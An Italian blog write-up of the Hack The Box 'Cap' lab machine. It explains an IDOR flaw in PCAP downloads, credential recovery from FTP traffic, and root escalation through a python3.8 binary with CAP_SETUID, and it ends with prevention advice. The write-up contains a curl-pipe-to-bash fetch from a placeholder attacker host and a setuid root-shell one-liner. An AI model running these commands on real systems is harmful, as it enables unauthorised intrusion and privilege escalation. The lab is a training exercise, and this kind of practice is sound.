<!DOCTYPE html><html lang="it"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Exploit della Macchina Cap di HTB - Cybergate Labpp</title><meta name="description" content="Introduzione Cap Ã¨ una macchina Linux a bassa difficoltÃ  progettata per test di sicurezza. Al suo interno Ã¨ presente un server HTTP dedicato ad attivitÃ  amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilitÃ  IDOR (Insecure Direct Object&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="canonical" href="https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html"><link rel="alternate" type="application/atom+xml" href="https://3nc0d3d.github.io/cybergatelab/feed.xml" title="Cybergate Labpp - RSS"><link rel="alternate" type="application/json" href="https://3nc0d3d.github.io/cybergatelab/feed.json" title="Cybergate Labpp - JSON"><meta property="og:title" content="Exploit della Macchina Cap di HTB"><meta property="og:image" content="https://3nc0d3d.github.io/cybergatelab/media/website/logoPsyber.jpeg"><meta property="og:image:width" content="1024"><meta property="og:image:height" content="1024"><meta property="og:site_name" content="Cybergate Labpp"><meta property="og:description" content="Introduzione Cap Ã¨ una macchina Linux a bassa difficoltÃ  progettata per test di sicurezza. Al suo interno Ã¨ presente un server HTTP dedicato ad attivitÃ  amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilitÃ  IDOR (Insecure Direct Object&hellip;"><meta property="og:url" content="https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html"><meta property="og:type" content="article"><link rel="stylesheet" href="https://3nc0d3d.github.io/cybergatelab/assets/css/style.css?v=8c8c1083e0ee34a627aed8c4964f67f9"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://3nc0d3d.github.io/cybergatelab/exploit-della-macchina-cap-di-htb.html"},"headline":"Exploit della Macchina Cap di HTB","datePublished":"2025-02-11T17:22+01:00","dateModified":"2025-02-15T19:17+01:00","image":{"@type":"ImageObject","url":"https://3nc0d3d.github.io/cybergatelab/media/website/logoPsyber.jpeg","height":1024,"width":1024},"description":"Introduzione Cap Ã¨ una macchina Linux a bassa difficoltÃ  progettata per test di sicurezza. Al suo interno Ã¨ presente un server HTTP dedicato ad attivitÃ  amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilitÃ  IDOR (Insecure Direct Object&hellip;","author":{"@type":"Person","name":"Alessandro","url":"https://3nc0d3d.github.io/cybergatelab/authors/alessandro/"},"publisher":{"@type":"Organization","name":"Alessandro","logo":{"@type":"ImageObject","url":"https://3nc0d3d.github.io/cybergatelab/media/website/logoPsyber.jpeg","height":1024,"width":1024}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body class="post-template"><header class="top js-header"><a class="logo" href="https://3nc0d3d.github.io/cybergatelab/"><img src="https://3nc0d3d.github.io/cybergatelab/media/website/logoPsyber.jpeg" alt="Cybergate Labpp" width="1024" height="1024"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://3nc0d3d.github.io/cybergatelab/about.html" target="_self">About</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>Exploit della Macchina Cap di HTB</h1><div class="feed__meta content__meta"><a href="https://3nc0d3d.github.io/cybergatelab/authors/alessandro/" class="feed__author">Alessandro</a> <time datetime="2025-02-11T17:22" class="feed__date">martedÃ¬, 11 febbraio 2025</time></div></div></header></div><div class="entry-wrapper content__entry"><h1 id="introduzione">Introduzione</h1><p>Cap Ã¨ una macchina Linux a bassa difficoltÃ  progettata per test di sicurezza. Al suo interno Ã¨ presente un server HTTP dedicato ad attivitÃ  amministrative, tra cui la cattura di traffico di rete. In questo write-up, analizzeremo come una vulnerabilitÃ  <strong>IDOR</strong> (Insecure Direct Object Reference) abbia permesso di accedere a dati sensibili e di ottenere privilegi root tramite escalation.</p><h1 id="cosÃ¨-lidor">Cosâ€™Ã¨ lâ€™IDOR?</h1><p>Lâ€™IDOR Ã¨ una <em>vulnerabilitÃ  che si verifica quando unâ€™applicazione espone riferimenti diretti a oggetti interni (es. ID di record, file) senza controllare i permessi dellâ€™utente</em>. CiÃ² consente a un attaccante di manipolare tali riferimenti per accedere a risorse non autorizzate.</p><h2 id="esempio-pratico">Esempio Pratico</h2><p>Supponiamo un URL come:</p><pre><code>http://esempio.com/documento/123
</code></pre><p>Se lâ€™applicazione non verifica che lâ€™utente abbia i diritti per accedere al documento con ID 123, modificando questo valore (es. 124) si potrebbe accedere a documenti altrui.</p><h2 id="rischi-associati">Rischi Associati</h2><ul><li>Esposizione di dati sensibili.</li><li>Manipolazione di risorse critiche.</li><li>DifficoltÃ  di individuazione (bassa visibilitÃ ).</li></ul><h2 id="prevenzione">Prevenzione</h2><ul><li>Implementare controlli di accesso granulari.</li><li>Utilizzare identificatori non prevedibili (es. UUID).</li><li>Validare e sanificare gli input.</li><li>Loggare le attivitÃ  sospette.</li></ul><h2 id="la-vulnerabilitÃ -nella-macchina-cap">La VulnerabilitÃ  nella Macchina Cap</h2><p>Lâ€™applicazione web di Cap permetteva il download di file PCAP (acquisizioni di traffico di rete) tramite URL come:</p><pre><code>http://10.10.10.56/data/2
</code></pre><p>Modificando lâ€™ID (2, 3, ecc.), era possibile scaricare PCAP appartenenti ad altri utenti, sfruttando proprio un IDOR.</p><h2 id="fasi-dellattacco">Fasi dellâ€™Attacco</h2><h3 id="1-scansione-iniziale">1. Scansione Iniziale</h3><p>Dopo aver configurato la VPN per accedere alla macchina, ho utilizzato <strong>nmap</strong> per identificare le porte aperte:</p><pre><code>nmap -sV 10.10.10.56
</code></pre><p>Risultato:</p><pre><code>Porta 21 (FTP), 22 (SSH), 80 (HTTP).
</code></pre><h3 id="2-exploit-dellidor">2. Exploit dellâ€™IDOR</h3><p>Modificando lâ€™ID nellâ€™URL (es. <a href="http://10.10.10.56/data/3">http://10.10.10.56/data/3</a>), ho scaricato diversi file PCAP.</p><h3 id="3-analisi-con-wireshark">3. Analisi con Wireshark</h3><p>Uno dei file PCAP conteneva una connessione FTP non cifrata, con credenziali in chiaro:</p><pre><code>User: nathan  
Password: Bu......F0RM3!
</code></pre><h3 id="4-accesso-ssh">4. Accesso SSH</h3><p>Le stesse credenziali erano valide per il servizio SSH:</p><pre><code>ssh nathan@10.10.10.56
</code></pre><h2 id="privilege-escalation-da-utente-a-root">Privilege Escalation: Da Utente a Root</h2><h3 id="1-ricerca-di-vulnerabilitÃ -con-linpeas">1. Ricerca di VulnerabilitÃ  con linPEAS</h3><hr><h4 id="cosÃ¨-linpeas-linux-privilege-escalation-awesome-script">Cosâ€™Ã¨ linPEAS (linux Privilege Escalation Awesome Script)</h4><p><em>linPEAS identifica potenziali vettori di escalation dei privilegi e vulnerabilitÃ  allâ€™interno di un sistema linux lo script si occupa di:</em></p><ul><li><em>verifica della configurazione e dei permessi di file critici</em></li><li><em>dentificazione di servizi in esecuzione e processi potenzialmente insicuri.</em></li><li><em>raccolta di informazioni su software installati, configurazioni di rete e possibili errori di configurazione.</em></li><li><em>Analisi di eventuali debolezze nei meccanismi di autenticazione e autorizzazione.</em></li></ul><hr><p>Dopo aver ottenuto lâ€™accesso come nathan, ho trasferito lo script linPEAS per individuare vettori di escalation:</p><p>Avvio di un server HTTP in locale:</p><pre><code>python -m http.server 80
</code></pre><p>Esecuzione di linPEAS sul target:</p><pre><code>curl http://&lt;IP_ATTACCANTE&gt;/linpeas.sh | bash
</code></pre><h3 id="2-individuazione-del-vettore-critico">2. Individuazione del Vettore Critico</h3><p>Lo script ha evidenziato che lâ€™eseguibile python3.8 possedeva il capability <strong>CAP_SETUID</strong>:</p><pre><code>/usr/bin/python3.8 = cap_setuid+ep
</code></pre><p>Questa capability consente a Python di modificare lâ€™UID del processo, permettendo di impersonare root, per cui possiamo eseguire da python una shell come root.</p><h3 id="3-exploit-finale">3. Exploit Finale</h3><p>Per ottenere una shell root, ho eseguito:</p><pre><code>import os
os.setuid(0)
os.system(&quot;/bin/bash&quot;)
</code></pre><p>Esecuzione:</p><pre><code>python3.8 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;
</code></pre><p>Risultato: Accesso come root! ðŸ”‘</p><h2 id="conclusioni">Conclusioni</h2><p>La macchina Cap dimostra due rischi critici:</p><ul><li>IDOR: Lâ€™assenza di controlli sugli ID ha permesso lâ€™accesso a dati altrui.</li><li>Capability Pericolose: Assegnare capability come CAP_SETUID a interpreti (es. Python) puÃ² portare a escalation catastrofiche.</li></ul><h2 id="best-practice">Best Practice</h2><ul><li>Limitare lâ€™uso di capability ai soli processi necessari.</li><li>Revisionare periodicamente i permessi dei file.</li><li>Adottare il principio del minimo privilegio.</li><li>Questo caso sottolinea lâ€™importanza di unâ€™igiene di sicurezza rigorosa, sia nel codice che nella configurazione di sistema.</li></ul></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on sabato, 15 febbraio 2025</p><div class="content__actions"><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://3nc0d3d.github.io/cybergatelab/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F3nc0d3d.github.io%2Fcybergatelab%2Fexploit-della-macchina-cap-di-htb.html" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://3nc0d3d.github.io/cybergatelab/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span></a></div></div></div><div class="content__bio bio"><div><h3 class="h4 bio__name"><a href="https://3nc0d3d.github.io/cybergatelab/authors/alessandro/" rel="author">Alessandro</a></h3></div></div></div><nav class="content__nav"><div class="wrapper"><div class="content__nav-inner"><div class="content__nav-next"><a href="https://3nc0d3d.github.io/cybergatelab/wfuzz-larma-segreta-per-il-fuzzing-di-applicazioni-web.html" class="content__nav-link" rel="next"><div><span>Next</span> Wfuzz: Lâ€™arma Segreta per il Fuzzing di Applicazioni Web</div></a></div></div></div></nav></footer></article></main><footer class="footer footer--glued"><div class="wrapper"><div class="footer__copyright"><p>Powered by Publii</p></div><button id="backToTop" class="footer__bttop" aria-label="Back to top" title="Back to top"><svg width="20" height="20"><use xlink:href="https://3nc0d3d.github.io/cybergatelab/assets/svg/svg-map.svg#toparrow"/></svg></button></div></footer><script defer="defer" src="https://3nc0d3d.github.io/cybergatelab/assets/js/scripts.min.js?v=ffcbea6c02c8178d10092962b235a5b0"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script></body></html>